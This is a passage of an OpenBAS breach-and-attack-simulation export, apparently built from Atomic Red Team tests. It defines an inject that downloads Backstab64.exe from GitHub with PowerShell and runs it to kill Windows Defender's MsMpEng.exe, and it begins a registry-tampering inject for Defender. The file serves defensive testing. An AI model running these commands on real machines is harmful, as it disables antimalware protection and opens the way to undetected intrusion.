        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Kill antimalware protected processes using Backstab",
          "fr" : "Kill antimalware protected processes using Backstab"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "process_name",
          "label" : "process_name",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "MsMpEng.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "7899bf0d-0921-4cce-91e1-3741695a8d95",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "7899bf0d-0921-4cce-91e1-3741695a8d95",
      "injector_contract_labels" : {
        "en" : "Kill antimalware protected processes using Backstab",
        "fr" : "Kill antimalware protected processes using Backstab"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Kill antimalware protected processes using Backstab\",\"fr\":\"Kill antimalware protected processes using Backstab\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"process_name\",\"label\":\"process_name\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"MsMpEng.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Backstab64_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Backstab64_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Backstab64.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Backstab64_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Backstab64_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Backstab64.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Backstab64_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\Backstab64_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/Backstab64.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"7899bf0d-0921-4cce-91e1-3741695a8d95\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "0c0aa31f-0363-4249-a831-a7073ecaefef",
        "payload_type" : "Command",
        "payload_name" : "Kill antimalware protected processes using Backstab",
        "payload_description" : "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
          "attack_pattern_name" : "Disable or Modify Tools",
          "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
          "attack_pattern_external_id" : "T1562.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "process_name",
          "default_value" : "MsMpEng.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/Backstab64.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\Backstab64.exe\"\n",
          "check_command" : "if (Test-Path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path}\") {exit 0} else {exit 1}",
          "description" : "Backstab64.exe should exist in ExtrnalPayloads Directory"
        }, {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory (split-path \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/../ExternalPayloads/Backstab64.exe\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path}\"",
          "check_command" : "if (Test-Path '#{PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path}') {exit 0} else {exit 1}",
          "description" : ""
        } ],
        "payload_external_id" : "24a12b91-05a7-4deb-8d7f-035fa98591bc",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:41.036182Z",
        "payload_updated_at" : "2025-07-03T14:45:29.016329Z",
        "command_executor" : "psh",
        "command_content" : "& \"#{PathToAtomicsFolder\\__\\ExternalPayloads\\Backstab64_exe_atomicredteam_path}\" -k -n #{process_name}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:41.052064Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:41.052064Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
        "attack_pattern_name" : "Disable or Modify Tools",
        "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
        "attack_pattern_external_id" : "T1562.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "53b3176a-c21e-4ed3-bb69-7669e6eaa85e",
    "inject_title" : "Tamper with Windows Defender Registry",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1320,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Tamper with Windows Defender Registry",
          "fr" : "Tamper with Windows Defender Registry"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
